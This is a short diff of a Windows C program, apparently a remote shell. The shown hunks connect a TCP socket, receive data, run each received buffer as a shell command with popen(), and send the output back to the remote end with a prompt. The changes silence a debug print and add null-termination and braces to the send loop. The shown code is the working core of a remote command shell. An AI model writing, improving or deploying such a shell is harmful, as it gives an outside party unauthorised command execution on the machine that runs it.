@@ -19,7 +19,7 @@ int main() {
   WSADATA wsaData;
   int wResult;
   WSAStartup(MAKEWORD(2,2), &wsaData);
-  
+
   // Create a socket to connect to an IP and port
   SOCKET ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 
@@ -36,11 +36,13 @@ int main() {
   // Receive data from port;
   do {
     res = recv( ConnectSocket, buf, BUF_LEN, 0 );
-    printf(buf);
+    //printf(buf);
     output = popen(buf, "r");
 
-    while (fgets(response, RESPONSE_SZ, output) != NULL)
+    while (fgets(response, RESPONSE_SZ, output) != NULL) {
+      response[sizeof(response) -2 ] = 0;
       send( ConnectSocket, response, RESPONSE_SZ, 0);
+    };
 
     send( ConnectSocket, prompt, sizeof(prompt), 0);
 
